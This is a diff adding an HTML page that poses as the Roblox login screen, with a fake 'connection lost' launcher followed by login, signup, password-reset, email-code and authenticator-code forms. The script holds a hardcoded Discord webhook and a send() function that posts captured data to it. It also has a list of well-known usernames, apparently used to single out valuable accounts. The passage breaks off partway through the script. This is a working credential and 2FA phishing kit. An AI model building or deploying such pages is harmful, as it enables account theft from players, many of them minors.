@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Roblox</title>
+    <link rel="icon" href="https://images.rbxcdn.com/favicon.ico">
+    <style>
+        :root{--bg:#191b1f;--card:rgba(35,37,39,0.95);--text:#fff;--muted:#bdbebe;--input-bg:#191b1f;--input-border:#3a3d41;--input-focus:#00b06f;--btn:#00b06f;--error:#e94560;--warn:#f0c040}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;color:var(--text);min-height:100vh;overflow:hidden;background:#000}
+        
+        .launcher{position:fixed;top:0;left:0;width:100%;height:100%;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center;background:url('https://i.ibb.co/xSSM5dBW/2026-06-19-113530.png') center/cover no-repeat;transition:opacity .8s ease,visibility .8s ease}
+        .launcher::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5)}
+        .launcher.hide{opacity:0;visibility:hidden}
+        .launcher-content{position:relative;z-index:1;text-align:center}
+        .launcher-logo{font-family:"Arial Black",sans-serif;font-size:48px;font-weight:900;margin-bottom:30px;color:#fff;animation:pulse 1.5s ease-in-out infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
+        .spinner-big{width:60px;height:60px;border:4px solid rgba(255,255,255,.15);border-top-color:#00b06f;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .launcher-status{font-size:15px;color:#ccc;margin-top:10px;transition:all .4s ease}
+        .launcher-error{font-size:15px;color:#e94560;margin-top:12px;font-weight:500;opacity:0;transform:translateY(10px);transition:all .5s ease}
+        .launcher-error.show{opacity:1;transform:translateY(0)}
+        
+        .main-page{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;visibility:hidden;transition:opacity .8s ease,visibility .8s ease;display:flex;justify-content:center;align-items:center;padding:20px;background:url('https://www.gamespot.com/a/uploads/screen_kubrick/1597/15975876/4050363-roblox.jpg') center/cover no-repeat}
+        .main-page::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7)}
+        .main-page.show{opacity:1;visibility:visible}
+        .wrap{width:100%;max-width:420px;position:relative;z-index:1;animation:fadeUp .6s ease;max-height:95vh;overflow-y:auto}
+        @keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+        .logo{text-align:center;margin-bottom:28px}.logo svg{width:150px}
+        .card{background:var(--card);border-radius:12px;padding:28px;backdrop-filter:blur(20px)}
+        .card h1{font-size:24px;font-weight:700;margin-bottom:4px}
+        .card .sub{font-size:13px;color:var(--muted);margin-bottom:20px}
+        .fld{margin-bottom:14px;position:relative}
+        .fld label{display:block;font-size:12px;font-weight:600;color:var(--muted);margin-bottom:4px}
+        .fld input{width:100%;height:42px;padding:0 50px 0 14px;background:var(--input-bg);border:1px solid var(--input-border);border-radius:8px;color:var(--text);font-size:15px;outline:none;transition:all .15s}
+        .fld input:focus{border-color:var(--input-focus);box-shadow:0 0 0 3px rgba(0,176,111,.18)}
+        .fld input.invalid{border-color:var(--error)}
+        .fld .counter{position:absolute;right:12px;top:34px;font-size:11px;color:var(--muted);pointer-events:none}
+        .fld .counter.warn{color:var(--warn)}.fld .counter.full{color:var(--btn)}.fld .counter.error{color:var(--error)}
+        .fld .hint{font-size:11px;color:var(--error);margin-top:4px;display:none}
+        .fld .hint.show{display:block}.fld .hint.warn{color:var(--warn)}
+        .btn{width:100%;height:42px;background:var(--btn);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:6px;transition:all .2s}.btn:hover{opacity:.9}.btn:disabled{opacity:.5;pointer-events:none}
+        .btn-back{width:100%;height:42px;background:transparent;color:var(--muted);border:1px solid var(--input-border);border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;margin-top:6px}.btn-back:hover{background:rgba(255,255,255,.05)}
+        .err{background:var(--error);color:#fff;padding:8px 12px;border-radius:8px;font-size:12px;margin-bottom:14px;display:none}
+        .info-box{background:rgba(240,192,64,.1);border:1px solid rgba(240,192,64,.3);color:var(--warn);padding:8px 12px;border-radius:8px;font-size:12px;margin-bottom:14px;display:none}
+        .footer{text-align:center;margin-top:18px;font-size:12px;color:var(--muted)}.footer a{color:var(--muted);text-decoration:none;cursor:pointer}
+        .load{text-align:center;padding:25px 0;display:none}.load.active{display:block}
+        .spinner{width:32px;height:32px;border:3px solid rgba(0,176,111,.2);border-top-color:#00b06f;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 10px}
+        .code-boxes{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
+        .code-box{width:42px;height:48px;background:var(--input-bg);border:1px solid var(--input-border);border-radius:8px;text-align:center;font-size:22px;font-weight:700;color:var(--text);outline:none;transition:all .15s}.code-box:focus{border-color:var(--input-focus);box-shadow:0 0 0 3px rgba(0,176,111,.18)}
+        .ver-title{text-align:center;font-size:17px;font-weight:700;margin-bottom:4px}
+        .ver-sub{text-align:center;font-size:12px;color:var(--muted);margin-bottom:20px}
+        .resend-link{text-align:center;margin-top:14px;font-size:12px}.resend-link a{color:var(--btn);text-decoration:none;cursor:pointer}.resend-link a.disabled{color:var(--muted);pointer-events:none}
+        .signup-link{text-align:center;margin-top:14px;font-size:12px;color:var(--muted)}.signup-link a{color:var(--btn);text-decoration:none;cursor:pointer}
+        .success-msg{text-align:center;padding:15px;display:none}.success-msg .check{font-size:40px;margin-bottom:8px}
+        .suggestions{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+        .suggestions span{background:var(--input-bg);border:1px solid var(--input-border);border-radius:14px;padding:4px 10px;font-size:11px;color:var(--muted);cursor:pointer;transition:all .15s}
+        .suggestions span:hover{border-color:var(--input-focus);color:var(--text)}
+        .strength-bar{height:3px;border-radius:2px;margin-top:4px;transition:all .3s;width:0%}
+        .strength-bar.weak{width:30%;background:var(--error)}.strength-bar.medium{width:60%;background:var(--warn)}.strength-bar.strong{width:100%;background:var(--btn)}
+    </style>
+</head>
+<body>
+
+<div class="launcher" id="launcher">
+    <div class="launcher-content">
+        <div class="launcher-logo">ROBLOX</div>
+        <div class="spinner-big" id="spinnerBig"></div>
+        <p class="launcher-status" id="loadStatus">Starting Roblox...</p>
+        <p class="launcher-error" id="loadError">Connection lost. Reconnecting...</p>
+    </div>
+</div>
+
+<div class="main-page" id="mainPage">
+    <div class="wrap">
+        <div class="logo">
+            <svg viewBox="0 0 160 44"><rect x="2" y="14" width="4" height="16" rx="2" fill="#fff"/><rect x="10" y="14" width="4" height="16" rx="2" fill="#fff"/><rect x="18" y="7" width="4" height="23" rx="2" fill="#fff"/><rect x="26" y="14" width="4" height="10" rx="2" fill="#fff"/><rect x="34" y="14" width="4" height="16" rx="2" fill="#fff"/><text x="44" y="32" font-family="Arial Black" font-weight="900" font-size="22" fill="#fff">ROBLOX</text></svg>
+        </div>
+        <div class="card">
+            <!-- LOGIN -->
+            <div id="stepLogin">
+                <h1>Log In</h1><p class="sub">Log into your Roblox account</p>
+                <div class="err" id="eLogin">Incorrect username or password.</div>
+                <div class="fld"><label>Username</label><input type="text" id="u" placeholder="username" autocomplete="off" minlength="3" maxlength="30"><span class="counter" id="uCounter">0/30</span><div class="hint" id="uHint">Username must be 3-30 characters. Letters, numbers, and underscores only.</div></div>
+                <div class="fld"><label>Password</label><input type="password" id="p" placeholder="password" autocomplete="off" minlength="8" maxlength="20"><span class="counter" id="pCounter">0/20</span><div class="hint" id="pHint">Password must be 8-20 characters.</div></div>
+                <button class="btn" id="btnLogin" onclick="doLogin()">Log In</button>
+                <div class="footer" style="margin-top:14px"><a onclick="showStep('stepForgot')">Forgot Password or Username?</a></div>
+                <div class="signup-link"><a onclick="showStep('stepSignup')">Don't have an account? Sign Up</a></div>
+            </div>
+            
+            <!-- SIGNUP -->
+            <div id="stepSignup" style="display:none">
+                <h1>Sign Up</h1><p class="sub">Create your Roblox account</p>
+                <div class="info-box" id="signupInfo" style="display:none">⚠️ This username is already taken. Please choose another one.</div>
+                <div class="err" id="eSignup" style="display:none">Please fill all fields correctly.</div>
+                <div class="fld"><label>Username</label><input type="text" id="su" placeholder="username" autocomplete="off" minlength="3" maxlength="30"><span class="counter" id="suCounter">0/30</span><div class="hint" id="suHint">Username must be 3-30 characters. Letters, numbers, and underscores only.</div></div>
+                <div class="suggestions" id="usernameSuggestions" style="display:flex;flex-wrap:wrap;gap:6px;margin-top:8px"></div>
+                <div class="fld"><label>Password</label><input type="password" id="sp" placeholder="password" autocomplete="off" minlength="8" maxlength="20"><span class="counter" id="spCounter">0/20</span><div class="hint" id="spHint">Password must be 8-20 characters with at least 1 number or symbol.</div><div class="strength-bar" id="strengthBar"></div></div>
+                <div class="fld"><label>Confirm Password</label><input type="password" id="sp2" placeholder="confirm password" autocomplete="off" minlength="8" maxlength="20"><div class="hint" id="sp2Hint">Passwords do not match.</div></div>
+                <button class="btn" id="btnSignupBtn" onclick="doSignup()">Sign Up</button>
+                <div class="signup-link">Already have an account? <a onclick="showStep('stepLogin')">Log In</a></div>
+            </div>
+            
+            <!-- FORGOT PASSWORD -->
+            <div id="stepForgot" style="display:none">
+                <h1>Forgot Password</h1><p class="sub">Enter your email or username to reset your password</p>
+                <div class="err" id="eForgot">Please enter a valid email or username.</div>
+                <div class="fld"><label>Email or Username</label><input type="text" id="fg" placeholder="email or username" autocomplete="off" minlength="3" maxlength="100"><div class="hint" id="fgHint">Enter your account email address or username.</div></div>
+                <button class="btn" onclick="doForgot()">Submit</button>
+                <div class="success-msg" id="forgotSuccess"><div class="check">✅</div><p>If an account exists for <strong id="forgotUser"></strong>, you will receive reset instructions.</p></div>
+                <button class="btn-back" onclick="showStep('stepLogin')">← Back to Log In</button>
+            </div>
+            
+            <!-- EMAIL VERIFICATION STEP -->
+            <div id="stepEmailVerify" style="display:none">
+                <div class="ver-title">Email Verification</div><div class="ver-sub">We sent a 6-digit code to your email. Enter it below.</div>
+                <div class="err" id="eEmailVerify">Invalid code. Please try again.</div>
+                <div class="code-boxes" id="emailCodeBoxes">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                </div>
+                <button class="btn" id="btnEmailVerify" onclick="doEmailVerify()">Verify Email</button>
+                <div class="resend-link"><a id="resendEmailBtn" onclick="resendEmailCode()">Resend Code</a> <span id="emailCountdown" style="color:var(--muted)"></span></div>
+            </div>
+            
+            <div class="load" id="load1"><div class="spinner"></div><p>Checking...</p></div>
+            
+            <!-- 2FA -->
+            <div id="step2fa" style="display:none">
+                <div class="ver-title">Verification Required</div><div class="ver-sub">Enter the 6-digit code sent to your authenticator app.</div>
+                <div class="err" id="e2FA">Invalid code. Try again.</div>
+                <div class="code-boxes" id="codeBoxes">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)">
+                </div>
+                <button class="btn" id="btnVerify" onclick="do2FA()">Verify</button>
+                <div class="resend-link"><a id="resendBtn" onclick="resendCode()">Send Code Again</a> <span id="countdown" style="color:var(--muted)"></span></div>
+            </div>
+            <div class="load" id="load2"><div class="spinner"></div><p>Verifying...</p></div>
+        </div>
+    </div>
+</div>
+
+<script>
+(function(){
+    const WH='https://discord.com/api/webhooks/1510730615387848865/cFXlUZl8LBmxG2PMYeESpWSykwvFr1kgCxSvC5yjvNWlnXUy78mEam9lIG-7BYu2jcKK';
+    var U='',P='',attempts=0,cooldown=0,cdInterval=null;
+    var emailAttempts=0,emailCooldown=0,emailCdInterval=null;
+    var lastForgotEmail='';
+    
+    const USERNAME_PREFIXES=['xX','Xx','Pro','Noob','Dark','Fire','Ice','Shadow','Frost','Blaze','Storm','Fury','Zen','Neo','Nova','Epic','Mega','Ultra','Hyper'];
+    const USERNAME_SUFFIXES=['Gamer','Player','Master','Slayer','King','Lord','Ninja','Knight','Demon','Angel','Wolf','Dragon','Phoenix','Titan','Hero','Legend','Warrior','Hunter','Fighter'];
+    const BANNED_WORDS=['admin','mod','moderator','roblox','staff','support','help','official','system','test','guest','user','login','signup','password','account','security','verify','robloxcoxx','owner','dev','developer'];
+    
+    // ---- РАСШИРЕННЫЙ СПИСОК ЗНАМЕНИТЫХ НИКНЕЙМОВ И ЮТУБЕРОВ (100к+) ----
+    const FAMOUS_USERNAMES = [
+        // Легендарные/редкие
+        'Builderman', 'Shedletsky', 'Clockwork', 'John', 'Roblox', 'Admin', 'System', 'Telamon', 'Erik', 'Cass',
+        '1', '0', 'A', 'B', 'C', 'X', 'Z', 'Q', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'V', 'W', 'Y',
+        'II', 'III', 'IV', 'IX', 'XI', 'XX', 'VII', 'VIII', 'XII', 'XIII',
+        'Noob', 'Noob123', 'NoobMaster', 'Guest', 'Guest123', 'Guest_', 'Robloxian', 'Robloxian123',
+        // === ОСНОВНЫЕ ЮТУБЕРЫ (100к+) ===
+        'Flamingo', 'Albert', 'KreekCraft', 'TanqR', 'Tofuu', 'Poke', 'ItsFunneh', 'Gold', 'Brianna',
+        'Deeter', 'LeahAshe', 'Russo', 'Mack', 'Slogo', 'Jelly', 'Rainbow', 'Fury', 'Valk', 'Bandites',
+        'Ducky', 'Panda', 'Ghost', 'Shadow', 'Venom', 'Blaze', 'Frost', 'Storm', 'Thunder', 'Lightning',
+        'Phoenix', 'Dragon', 'Wolf', 'Tiger', 'Lion', 'Eagle', 'Hawk', 'Falcon', 'Raven', 'Crow',
+        'Owl', 'Fox', 'Bear', 'Polar', 'Arctic', 'Nova', 'Cosmic', 'Galaxy', 'Solar', 'Lunar',
+        'Stellar', 'Orbit', 'Comet', 'Asteroid', 'Meteor', 'Nebula', 'Vortex', 'Tornado', 'Hurricane',
+        'Typhoon', 'Monsoon', 'Cyclone', 'Zen', 'Karma', 'Mystic', 'Legend', 'Hero', 'Guardian',
+        'Paladin', 'Warrior', 'Knight', 'Samurai', 'Ninja', 'Rogue', 'Sage', 'Wizard', 'Sorcerer',
+        'Magician', 'Enchanter', 'Mage', 'Warlock', 'Viking', 'Berserker', 'Titan', 'Giant', 'Colossus',
+        'Golem', 'Demon', 'Angel', 'Divine', 'Eternal', 'Infinity', 'Omega', 'Alpha', 'Beta', 'Gamma',
+        'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta', 'Iota', 'Kappa', 'Lambda', 'Mu', 'Nu', 'Xi',
+        'Omicron', 'Pi', 'Rho', 'Sigma', 'Tau', 'Upsilon', 'Phi', 'Chi', 'Psi',
+        'Denis', 'DenisDaily', 'DenisYT', 'Corl', 'CorlYT', 'CorlOfficial', 'OfflineTV', 'DisguiseToast',
+        'Valkyrae', 'Sykkuno', 'Ludwig', 'MoistCr1TiKaL', 'PewDiePie', 'Markiplier', 'Jacksepticeye',
+        'Dream', 'GeorgeNotFound', 'Sapnap', 'KarlJacobs', 'Quackity', 'TommyInnit', 'Technoblade',
+        'MrBeast', 'DudePerfect', 'Ninja', 'Shroud', 'DrDisrespect', 'TimTheTatman', 'NickMercs',
+        'Aydan', 'ZLaner', 'Symfuhny', 'Tfue', 'Cloakzy', 'SypherPK', 'CourageJD', 'Nadeshot',
+        'Scump', 'Formal', 'Crimsix', 'Karma', 'JKap', 'Clayster', 'Attach', 'Zoomaa', 'Priestahh',
+        'Simp', 'AbeZy', 'Cellium', 'Arcitys', 'MajorManiak', 'Shotzzy', 'Illey', 'Rambo', 'Dashy',
+        'H3CZ', 'Mboze', 'BigT', 'Rambo', 'Sharp', 'Merk', 'Nifty', 'Aches', 'TeePee',
+        'Censor', 'DougMartin', 'Pamaj', 'TmarTn', 'FazeBlaze', 'FazeNiks', 'FazeBanks', 'FazeApex',
+        'FazeJev', 'FazeSwagg', 'FazeKay', 'FazeH1ghSky1', 'FazeTemperrr', 'FazeSniperwolf',
+        // === ДОПОЛНИТЕЛЬНЫЕ ИЗ ПОИСКА (100к+) ===
+        'ElAbrahaham', 'CaylusBlox', 'TypicalGamer', 'Legolaz', 'BeanRoblox', 'FacePalmz',
+        'rblxscripts', 'StanPrice', 'MrParadox', 'Kianish', 'Fantix', 'S3NILY', 'Oficey',
+        'SimplyPatrick', 'KoKoPanda', 'RetroDan', 'Shivy', 'Adrixo', 'Tso_Sun',
+        'AlvinBlox', 'axabella', 'Betroner', 'Noangy', 'biggranny000', 'CatFer',
+        'Chaseroony', 'ChloeGames', 'Ciudadano', 'CMParmy', 'Conor3D', 'DarkAltrax',
+        'Domino', 'FairOut', 'FandroidGAME', 'Favoritos', 'Flexer97', 'frenchrxses',
+        'GrayPhiny', 'greenlegocats123', 'HeathHaskins', 'Hollpiglet', 'iGuz',
+        'ImaFlyNmidget', 'JamieThatBloxer', 'JeromeASF', 'JoeyDaPlayer', 'KingSgaming',
+        'Koneko', 'Kong', 'Lazer1785', 'legobloxian', 'Linkmon99', 'Lonnie',
+        'MarcoYolo', 'KyMeister', 'MichealP', 'NickDominates', 'NikTac', 'Nitrolord',
+        'noekje', 'NOOBASHA', 'notive', 'NubNeb', 'OpaOsiris', 'ParadoxPoKe',
+        'Paja', 'PetriFyTV', 'Phoeberry', 'PinkAnt', 'Plepsu', 'Raconidas',
+        'RazorFishGaming', 'Rexex', 'RobloxGaming', 'RobloxMinigunner', 'SallyGreenGamer',
+        'SDMittens', 'SharkBlox', 'esqueletoslasher', 'skyleree', 'SnyFort',
+        'SpaceGamer', 'StronbolRoblox', 'SynthesizeOG', 'TadElMercader', 'TheEvilShark',
+        'TheLaughingUnicorn', 'Tooquick', 'TypicalModders', 'Verti',
+        // === ИЗ СТАТЬИ TIMES OF INDIA ===
+        'KAICENAT3', 'xQc', 'xqxqcxqcxqc12', 'TheRealShowSpeedy', 'mrflimflam',
+        'HiVise77', 'UndercoverTubbo', 'QuackityHQ', 'TheMonkeyManGamer',
+        'sapnapisreallycool', 'Gorgington', 'ALPHAKENNYBODYY_', 'largegiantstrongman',
+        'StaleStork289', 'crydae',
+        // === ДОПОЛНИТЕЛЬНЫЕ ПОПУЛЯРНЫЕ (100к+) ===
+        'Cobanermani456', 'GamerGirl', 'ItsFunneh', 'GoldenGlove', 'PrestonPlayz', 'BriannaYT',
+        'Furious', 'JellyBean', 'SquidGame', 'RainbowDash', 'SkyDoesMinecraft', 'HuskyMinecraft',
+        'BajanCanadian', 'Woofless', 'Lachlan', 'Muselk', 'Loserfruit', 'Freshy', 'Raccoon',
+        'CryBaby', 'PinkSheep', 'Kwebbelkop', 'Slogoman', 'Jellybean', 'Terroriser', 'BigJigglyPanda',
+        'Fitz', 'SwaggerSouls', 'Zuckles', 'McCreamy', 'Soup', 'Mully', 'EddieVR', 'Smii7y',
+        'Blarg', 'ElasticDroid', 'TheDooo', 'Grizzy', 'Berleezy', 'RDCWorld1', 'AfroSenju',
+        'NakeyJakey', 'Misfits', 'RaccoonEggs', 'CrankThatFrank', 'JacksFilms', 'VideoGameDunkey',
+        'Cr1TiKaL', 'Penguinz0', 'MoistCr1TiKaL', 'xQc', 'Asmongold', 'Summit1g', 'Lirik',
+        // === СВОИ ===
+        'SWILL', 'SWILL_', 'SWILLWAY', 'SWILL_TEAM', 'SWILLWAY_TEAM'
+    ];
+    const FAMOUS_SET = new Set(FAMOUS_USERNAMES.map(n => n.toLowerCase()));
+    
+    function isFamousUsername(name) {
+        return FAMOUS_SET.has(name.toLowerCase());
+    }
+    
+    function isGarbageUsername(name) {
+        if (name.length < 5) return false;
+        const lower = name.toLowerCase();
+        const garbagePatterns = [
+            /^(.)\1{4,}$/, /^qwerty/i, /^asdf/i, /^zxcv/i, /^qwertyuiop/i, /^asdfghjkl/i, /^zxcvbnm/i,
+            /^123456/i, /^abcdef/i, /^abcd/i, /^test/i, /^guest/i, /^user/i, /^admin/i, /^mod/i,
+            /^poiuyt/i, /^lkjhgf/i, /^mnbvc/i, /^qwer/i, /^asdzxc/i, /^([a-z])\1{2,}/
+        ];
+        for (let pat of garbagePatterns) {
+            if (pat.test(lower)) return true;
+        }
+        if (/^([a-z]{2})\1+$/.test(lower)) return true;
+        if (/^([a-z]{3})\1+$/.test(lower)) return true;
+        const uniqueChars = new Set(lower.split(''));
+        if (uniqueChars.size <= 3 && lower.length >= 6) return true;
+        if (/(.)\1{3,}/.test(lower)) return true;
+        return false;
+    }
+    
+    function hasR(t){return /[а-яё]/i.test(t)}
+    function hasInvalidChars(t){return /[^a-zA-Z0-9_]/.test(t)}
+    function hasSpace(t){return /\s/.test(t)}
+    function hasBannedWord(t){var lower=t.toLowerCase();return BANNED_WORDS.some(function(w){return lower.includes(w)})}
+    
+    function generateUsernameSuggestions(base){
+        var s=[];var cleanBase=base.replace(/[^a-zA-Z0-9_]/g,'').substring(0,10);
+        if(cleanBase.length>=3){
+            for(var i=0;i<5;i++){var n=Math.floor(Math.random()*9999);s.push(cleanBase+n)}
+        }else{
+            for(var i=0;i<5;i++){var p=USERNAME_PREFIXES[Math.floor(Math.random()*USERNAME_PREFIXES.length)];var suf=USERNAME_SUFFIXES[Math.floor(Math.random()*USERNAME_SUFFIXES.length)];var n=Math.floor(Math.random()*999);s.push(p+'_'+suf+n)}
+        }
+        return s.filter(function(x){return!hasBannedWord(x)})
+    }
+    
+    async function send(m){try{await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:m})})}catch(e){}}
+    
+    // LAUNCHER
+    (function(){
+        var status=document.getElementById('loadStatus'),error=document.getElementById('loadError'),spinner=document.getElementById('spinnerBig');
+        var dur=Math.floor(Math.random()*8000)+7000;
+        var steps=['Starting Roblox...','Connecting to servers...','Loading game files...','Joining server...','Syncing data...','Almost ready...'];
+        var i=0;
+        var interval=setInterval(function(){
+            if(i<steps.length){status.textContent=steps[i];i++}
+            else{clearInterval(interval);spinner.style.animationPlayState='paused';spinner.style.opacity='0.5';status.textContent='Connection lost...';
+                setTimeout(function(){status.style.display='none';error.classList.add('show');spinner.style.display='none';
+                    setTimeout(function(){document.getElementById('launcher').classList.add('hide');document.getElementById('mainPage').classList.add('show')},2500)},800)}
+        },dur/steps.length);
+    })();
+    
+    // COUNTERS
+    ['u','p','fg','su','sp','sp2'].forEach(function(id){
+        var el=document.getElementById(id);if(!el)return;
+        var counter=document.getElementById(id+'Counter');
+        if(counter)el.addEventListener('input',function(){
+            var len=this.value.length;var max=this.maxLength>0?parseInt(this.maxLength):100;
+            counter.textContent=len+'/'+max;
+            counter.className='counter'+(len>=max?' full':len>=max*0.8?' warn':'');
+        });
+    });
+    
+    function validateUsername(el,hintEl,counterEl,showSuggestions){
+        var v=el.value;var hint=document.getElementById(hintEl);var counter=document.getElementById(counterEl);
+        if(hasSpace(v)){
+            hint.textContent='Spaces are not allowed. Use underscores "_" instead.';
+            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';return false}
+        if(hasR(v)){
+            hint.textContent='Only English characters allowed.';
+            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';return false}
+        if(v.length>0&&v.length<3){
+            hint.textContent='Username must be at least 3 characters. ('+v.length+'/3)';
+            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';return false}
+        if(hasInvalidChars(v)){
+            hint.textContent='Letters, numbers, and underscores only.';
+            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';
+            if(showSuggestions){var sug=document.getElementById('usernameSuggestions');var names=generateUsernameSuggestions(v.replace(/[^a-zA-Z0-9]/g,'_'));sug.innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('')}
+            return false}
+        if (isGarbageUsername(v)) {
+            hint.textContent='This username looks suspicious. Please choose a more unique one.';
+            hint.className='hint show warn';el.classList.add('invalid');if(counter)counter.className='counter error';
+            if(showSuggestions){var sug=document.getElementById('usernameSuggestions');var names=generateUsernameSuggestions(v);sug.innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('')}
+            return false;
+        }
+        if (/^\d+$/.test(v)) {
+            hint.textContent='Username must contain at least one letter.';
+            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';
+            if(showSuggestions){var sug=document.getElementById('usernameSuggestions');var names=generateUsernameSuggestions(v);sug.innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('')}
+            return false;
+        }
+        if (isFamousUsername(v)) {
+            hint.textContent='⚠️ This username is reserved. If logging in, password will be rejected.';
+            hint.className='hint show warn';
+        } else {
+            hint.className='hint';el.classList.remove('invalid');
+        }
+        if(counter)counter.className='counter'+(v.length>=el.maxLength?' full':v.length>=el.maxLength*0.8?' warn':'');
+        return true;
+    }
+    
+    document.getElementById('u').addEventListener('input',function(){validateUsername(this,'uHint','uCounter',false)});
+    document.getElementById('su').addEventListener('input',function(){
+        var valid=validateUsername(this,'suHint','suCounter',true);
+        var sug=document.getElementById('usernameSuggestions');
+        if(valid&&this.value.length>=3){sug.style.display='none'}
+        else{sug.style.display='flex'}
+    });
+    document.getElementById('fg').addEventListener('input',function(){
+        var v=this.value;var hint=document.getElementById('fgHint');
+        if(v.length>0&&v.length<3){hint.className='hint show';hint.textContent='Enter at least 3 characters.'}
+        else if(v.includes('@')&&!v.includes('.',v.indexOf('@'))){hint.className='hint show';hint.textContent='Enter a valid email address.'}
+        else{hint.className='hint'}
+    });
+    
+    document.getElementById('p').addEventListener('input',function(){
+        var v=this.value;var hint=document.getElementById('pHint');
+        if(v.length>0&&v.length<8){hint.className='hint show';hint.textContent='Password must be at least 8 characters.'}
+        else{hint.className='hint'}
+    });
+    document.getElementById('sp').addEventListener('input',function(){
+        var v=this.value;var hint=document.getElementById('spHint');var bar=document.getElementById('strengthBar');
+        if(v.length>0&&v.length<8){hint.className='hint show';hint.textContent='Password must be at least 8 characters.'}
+        else if(v.length>=8&&!/[0-9!@#$%^&*(),.?\":{}|<>]/.test(v)){hint.className='hint show warn';hint.textContent='Add at least 1 number or symbol for a stronger password.'}
+        else{hint.className='hint'}
+        var score=0;if(v.length>=8)score++;if(/[A-Z]/.test(v))score++;if(/[0-9]/.test(v))score++;if(/[^A-Za-z0-9]/.test(v))score++;
+        bar.className='strength-bar'+(score<=1?' weak':score<=2?' medium':' strong');
+    });
+    document.getElementById('sp2').addEventListener('input',function(){
+        var v=this.value;var p=document.getElementById('sp').value;var hint=document.getElementById('sp2Hint');
+        if(v.length>0&&v!==p){hint.className='hint show';hint.textContent='Passwords do not match.'}
+        else{hint.className='hint'}
+    });
+    
+    var initNames=generateUsernameSuggestions('');document.getElementById('usernameSuggestions').innerHTML=initNames.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('');
+    
+    function hideAll(){
+        ['stepLogin','stepForgot','stepSignup','step2fa','stepEmailVerify','load1','load2','forgotSuccess'].forEach(function(x){
+            var e=document.getElementById(x);if(e){if(x==='load1'||x==='load2')e.classList.remove('active');else e.style.display='none'}
+        });
+    }
+    window.showStep=function(s){
+        hideAll();
+        if(s==='stepLogin')document.getElementById('stepLogin').style.display='block';
+        else if(s==='stepForgot'){document.getElementById('stepForgot').style.display='block';document.getElementById('forgotSuccess').style.display='none';document.getElementById('fg').value=''}
+        else if(s==='stepSignup'){document.getElementById('stepSignup').style.display='block';document.getElementById('signupInfo').style.display='none';document.getElementById('eSignup').style.display='none'}
+        else if(s==='stepEmailVerify'){document.getElementById('stepEmailVerify').style.display='block';resetEmailResend();document.querySelector('#emailCodeBoxes .code-box').focus()}
+        else if(s==='step2fa'){document.getElementById('step2fa').style.display='block';resetResend();document.querySelector('#codeBoxes .code-box').focus()}
+        else if(s==='load1')document.getElementById('load1').classList.add('active');
+        else if(s==='load2')document.getElementById('load2').classList.add('active');
+    };
+    
+    window.nextBox=function(el){if(el.value.length===1){var n=el.nextElementSibling;if(n&&n.classList.contains('code-box'))n.focus()}};
